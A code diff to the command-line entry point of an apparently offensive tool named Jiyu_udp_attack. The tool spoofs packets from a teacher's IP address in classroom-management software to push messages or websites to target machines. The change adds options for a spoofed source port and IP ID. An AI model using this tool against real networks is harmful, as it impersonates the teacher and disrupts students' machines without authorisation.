@@ -21,8 +21,10 @@ if __name__ == "__main__":
         epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/",
     )
     parser.add_argument("-s", "--teacher-ip", type=str, required=True, help="Teacher's IP address")
+    parser.add_argument("-f", "--teacher-port", type=int, default=None, help="Teacher's port (default to random port)")
     parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
     parser.add_argument("-p", "--port", type=int, default=4705, help="Port to send packets to (default: 4705)")
+    parser.add_argument("-i", "--ip-id", type=int, default=None, help="IP ID for the packet (default: random ID)")
 
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("-m", "--message", type=str, help="Message to send")
@@ -31,6 +33,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
     teacher_ip = args.teacher_ip
+    teacher_port = args.teacher_port
     target = args.target
     port = args.port
     if args.message:
@@ -42,5 +45,5 @@ if __name__ == "__main__":
     else:
         raise ValueError("Either message or website must be provided")
 
-    broadcast_packet(teacher_ip, target, port, payload)
+    broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
     print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
